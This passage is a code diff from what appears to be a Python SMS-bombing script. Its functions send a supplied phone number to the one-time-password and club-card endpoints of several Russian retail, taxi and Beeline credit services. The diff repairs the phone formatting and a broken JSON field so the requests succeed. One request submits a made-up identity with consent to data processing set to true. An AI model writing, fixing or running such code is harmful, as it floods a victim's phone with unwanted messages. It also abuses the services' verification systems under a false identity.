@@ -140,7 +140,7 @@ def taxi2412recover(phone):
     print(response_taxi2412, response_taxi2412.text)
 
 def ostin(phone):
-    ostnphn = '%207%20' + '+' + '(' + phone[:3] + ')' + phone[3:6] + '-' + phone[6:8] + '-'\
+    ostnphn = '%207%20' + '(' + phone[:3] + ')' + phone[3:6] + '-' + phone[6:8] + '-'\
               + phone[8:10]
     response_ostin = requests.post(url=('https://ostin.com/ru/ru/secured/myaccount/myclubcard/'
                                         'resultClubCard.jsp?type='
@@ -148,7 +148,7 @@ def ostin(phone):
     print(response_ostin, response_ostin.text)
 
 def funday(phone):
-    fndphn = '+7%20' + '+' + '(' + phone[:3] + ')' + phone[3:6] + '-' + phone[6:8] + '-'\
+    fndphn = '+7%20' + '(' + phone[:3] + ')' + phone[3:6] + '-' + phone[6:8] + '-'\
              + phone[8:10]
     response_funday = requests.post(url=('http://fundayshop.com/ru/ru/secured/myaccount/myclubcard/'
                                          'resultClubCard.jsp?type='
@@ -209,7 +209,7 @@ def beelinecredit(phone):
     response_beelinecredit = requests.post(url='(https://credit-beeline.ru/api/identityproof/'
                                                'sendonetimepassword)',
                                            json={"personalData": {"firstName": "Иван",
-                                                 "lastName": "Петров", eName": "Романович",
+                                                 "lastName": "Петров", "middleName": "Романович",
                                                                   "phoneNumber": blncrdtphn},
                                                  "consentToDataProcessing": "true"})
     print(response_beelinecredit, response_beelinecredit.content)
